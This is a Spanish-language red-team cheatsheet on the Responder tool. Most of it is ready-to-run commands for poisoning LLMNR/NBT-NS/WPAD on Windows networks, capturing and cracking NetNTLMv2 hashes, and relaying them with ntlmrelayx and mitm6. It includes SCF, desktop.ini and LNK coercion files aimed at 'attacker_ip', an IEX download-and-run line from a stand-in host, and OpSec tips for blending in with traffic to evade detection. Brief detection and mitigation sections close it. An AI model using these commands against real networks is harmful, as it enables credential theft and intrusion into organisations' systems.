---
aliases:
  - Responder.py
tags:
  - technique/credential-access
  - technique/mitm
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - tool/responder
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Tool
linked:
  - "[[NTLM Relay]]"
  - "[[Impacket Toolkit]]"
  - "[[Authentication Coercion]]"
---
# Responder

---

## Cheatsheet
^responder-cheatsheet

| Modo | Comando | Uso |
| --- | --- | --- |
| **Full poison** | `sudo responder -I eth0 -wv` | Captura default |
| **Analyze (no poison)** | `sudo responder -I eth0 -A` | Observar sin responder — recon |
| **Relay mode** | `sudo responder -I eth0 -rdwv` | Para usar con ntlmrelayx |
| **Disable SMB/HTTP** | `sudo responder -I eth0 -wFv` | Si vas a correr ntlmrelayx en paralelo |
| **Force auth** | `sudo responder -I eth0 -Pdwv` | Force NTLM downgrade |
| **WPAD only** | `sudo responder -I eth0 -w` | Solo WPAD (proxy) |
| **Hashes capturados** | `/usr/share/responder/logs/` | NetNTLMv2 → hashcat -m 5600 |

---

## Concepto

Windows usa fallback hierarchy para resolver nombres:
1. Local hosts file + cache DNS.
2. **LLMNR** (Link-Local Multicast Name Resolution, UDP 5355) — multicast IPv4/IPv6.
3. **NBT-NS** (NetBIOS Name Service, UDP 137) — broadcast.
4. **mDNS** (Multicast DNS, UDP 5353) — bonjour/zeroconf.

Si DNS no resuelve (typo, share-nombre-inexistente, WPAD en DHCP), el host envía broadcast preguntando. Responder finge ser el recurso, recibe NTLM challenge-response → captura NetNTLMv2 hash para crack/relay.

## Requisitos

- Acceso a la red interna (same broadcast domain / VLAN).
- Root en la interface para bind a puertos privilegiados.
- Hosts Windows con LLMNR/NBT-NS/mDNS habilitados (default hasta GPO explícito).

## 1. Setup básico

```bash
# Ubicación default
cd /usr/share/responder/
# o
git clone https://github.com/SpecterOps/Responder.git

# Listar interfaces
ip a

# Full capture
sudo responder -I eth0 -wv
```

Flags comunes:

| Flag | Qué hace |
| --- | --- |
| `-I IFACE` | Interface a usar (obligatorio) |
| `-w` | Enable WPAD proxy server |
| `-v` | Verbose |
| `-d` | Enable answers for DHCP broadcast requests |
| `-r` | Enable answers for NetBIOS wredir queries |
| `-F` | Force WPAD auth with NTLM (no anon) |
| `-P` | Force basic auth for proxy |
| `-A` | Analyze only — no poisoning |
| `--lm` | Force LM downgrade |
| `--disable-ess` | Disable Extended Session Security (weaker hash) |

## 2. Modo Analyze (recon sin noise)

```bash
sudo responder -I eth0 -A
```

Observa qué queries LLMNR/NBT-NS aparecen sin envenenar. Identifica:
- Hostnames típicos solicitados (fileserver que no existe, typos).
- Hosts que emiten queries más frecuentemente.
- IPv6 activity (mitm6 candidate).

Output en `/usr/share/responder/logs/Analyzer-Session.log`.

## 3. Modo captura (default)

```bash
sudo responder -I eth0 -wv
```

Salida ejemplo:
```
[SMB] NTLMv2-SSP Client   : 10.10.10.15
[SMB] NTLMv2-SSP Username : DOM\juan.perez
[SMB] NTLMv2-SSP Hash     : juan.perez::DOM:1122334455667788:abc...hash...
```

Hashes guardados automáticamente en:
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.15.txt
/usr/share/responder/logs/HTTP-NTLMv2-10.10.10.15.txt
/usr/share/responder/logs/Responder-Session.log
```

## 4. Crack offline

```bash
# NetNTLMv2 (modo 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Con rules
hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt

# NetNTLMv1 (si --lm forzado, raro)
hashcat -m 5500 hash.txt rockyou.txt
```

NetNTLMv2 **no es** el NT hash. No se puede PtH con NetNTLMv2 → solo crack o relay.

## 5. Relay mode (combinar con ntlmrelayx)

Responder no hace relay directo — setea el NTLM server para capturar pero deja `ntlmrelayx` tomar control.

### Config Responder para relay
Editar `/usr/share/responder/Responder.conf`:
```
[Responder Core]
SMB = Off
HTTP = Off
```

O usar flag:
```bash
sudo responder -I eth0 -wFb
# -F: Force WPAD auth
# -b: Return Basic HTTP authentication (no NTLM captured by Responder)
# SMB/HTTP internos deshabilitados
```

### Pipeline relay

Terminal 1:
```bash
sudo responder -I eth0 -wFb
```

Terminal 2:
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

Víctima busca `\\fileserver` (no existe) → Responder envenena → cliente envía NTLM → ntlmrelayx relayea al target real.

## 6. Force auth tricks

### WPAD (Web Proxy Auto-Discovery)
Browser/OS busca `wpad.dom.local` → Responder responde → browser pide proxy config → Responder sirve PAC hostil → todas las conexiones HTTP van via Responder → NTLM challenge → capture.

```bash
sudo responder -I eth0 -wFbv
```

### NetBIOS typos
Share `\\fileserver` vs typo `\\fileservre`. Responder responde a queries inválidos.

### SCF file en share compartida
Drop `.scf` en share writable → cada Explorer abre el folder → triggerea auth a path UNC.

```
[Shell]
Command=2
IconFile=\\attacker_ip\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

Save como `desktop.scf` (o cualquier nombre) en share. IconFile trigger auto.

### Desktop.ini
```ini
[.ShellClassInfo]
IconResource=\\attacker_ip\share\icon.ico
```

Drop en folder → auth triggered cuando user browsea.

### LNK file
```
.lnk con IconLocation=\\attacker_ip\icon.ico
```

## 7. Combos

### IPv6 takeover (mitm6 + Responder/ntlmrelayx)

mitm6 abusa de IPv6 DHCP default (Windows prefiere IPv6 si disponible) → asigna atacante como DNS → todas resoluciones van a atacante.

```bash
# Terminal 1: IPv6 takeover
sudo mitm6 -d dom.local

# Terminal 2: relay
sudo ntlmrelayx.py -6 -wh fake-wpad.dom.local -t ldaps://DC --delegate-access
```

Mucho más efectivo que LLMNR porque IPv6 DHCPv6 requests son constantes.

### Responder + Inveigh (Windows equivalent)
Si solo tenés acceso Windows, usar Inveigh:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATK/Inveigh.ps1')
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y
```

## 8. Challenge downgrade

### Force LM hash (obsoleto pero aún en legacy)
```bash
sudo responder -I eth0 --lm -wv
```

Captura NTLMv1 → crack trivial con `crack.sh` (rainbow tables) o hashcat `-m 5500`.

### Disable ESS (Extended Session Security)
```bash
sudo responder -I eth0 --disable-ess -wv
```

Hace NetNTLMv2 ligeramente más débil — marginal.

## 9. OpSec

### Ruido alto
- Responder genera eventos visibles:
  - Queries LLMNR/NBT-NS masivas.
  - SMB/HTTP servers corriendo en puerto 445/80/8080.
  - DHCP/DNS anómalo en red.
- SIEM enterprise detecta Responder por patterns.

### Tips
- **Analyze mode primero** (24h) para baseline antes de poisoning.
- **Targeted** poison (filtro por hostname específico) si Responder soporta.
- Correr durante **office hours** para mezclarse con tráfico normal.
- **Disable SMB/HTTP** interno si vas a relay (conflicto de puertos + menos logs).
- Solo capturar **hashes de users reales** (filtrar computer accounts por `$` al final).
- **Stop** post-capture. No dejarlo corriendo pasivamente.

### Detecciones (blue)
- Monitor LLMNR/NBT-NS queries con respuestas anómalas.
- Honeypot hostname (`HQ-FS-01` inexistente) → query triggers alert.
- WPAD monitoring (corporate WPAD config vs rogue answer).
- Event 4625 masivo con NTLMv2 auth fallidos.

## 10. Mitigaciones (blue)

- **Disable LLMNR** via GPO: `Computer Configuration > Administrative Templates > Network > DNS Client > Turn OFF Multicast Name Resolution = Enabled`.
- **Disable NBT-NS** via DHCP option 001 NetBIOS = 0x2.
- **Disable mDNS** en Windows 10+ via GPO o registry.
- **SMB signing required** → NetNTLMv2 capturado no relayeable a SMB.
- **LDAP signing + channel binding** → LDAP/LDAPS no relayeables sin downgrade.
- **EPA** en HTTP endpoints.
- **WPAD** deshabilitado si no se usa.
- **Protected Users** group.
- **Strong passwords + length** para hacer crack offline inviable.

## Recursos

- [Responder GitHub](https://github.com/SpecterOps/Responder)
- [HackTricks - Responder](https://book.hacktricks.xyz/network-services-pentesting/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
- [Inveigh - Windows equivalent](https://github.com/Kevin-Robertson/Inveigh)
- [mitm6](https://github.com/dirkjanm/mitm6)

---
